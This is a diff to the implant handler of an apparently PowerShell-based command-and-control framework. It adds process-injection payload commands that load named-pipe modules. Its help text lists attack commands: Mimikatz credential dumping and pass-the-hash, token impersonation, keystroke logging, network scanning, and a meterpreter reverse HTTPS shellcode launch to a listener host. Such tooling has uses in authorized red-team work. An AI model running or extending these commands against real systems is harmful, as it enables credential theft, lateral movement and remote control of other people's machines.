@@ -186,8 +186,8 @@ function Implant-Handler
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
-        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:44c2b4647c1ef4059915fgaf71311 /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
-        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:44c2b4647c1ef4059915fgaf71311 /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
+        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
+        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
         write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
         write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
         write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
@@ -204,7 +204,8 @@ function Implant-Handler
         write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
         write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
-        #write-host " Invoke-PSInject -ProcID 4444 -PoshCode 'iex get-process'" -ForegroundColor Green
+        write-host " Invoke-PSInject-Payload -ProcID 4444" -ForegroundColor Green
+        write-host " Invoke-PSInject-ProxyPayload (migrates to netsh.exe automatically if not procid is passed)" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
         write-host `n "Implant Handler: " -ForegroundColor Green
         write-host "=====================" -ForegroundColor Red
@@ -670,6 +671,20 @@ $error.clear()
             if ($pscommand.ToLower().StartsWith('invoke-psinject'))
             { 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-psinject-payload'))
+            { 
+                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipe.ps1" $psrandomuri
+                $psargs = $pscommand -replace 'invoke-psinject-payload',''
+                $pscommand = "invoke-psinject -payloadtype normal $($psargs)"
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-psinject-proxypayload'))
+            { 
+                CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+                CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
+                $psargs = $pscommand -replace 'invoke-psinject-proxypayload',''
+                $pscommand = "invoke-psinject -payloadtype proxy $($psargs)"
             }
             if ($pscommand.ToLower().StartsWith('test-adcredential'))
             { 
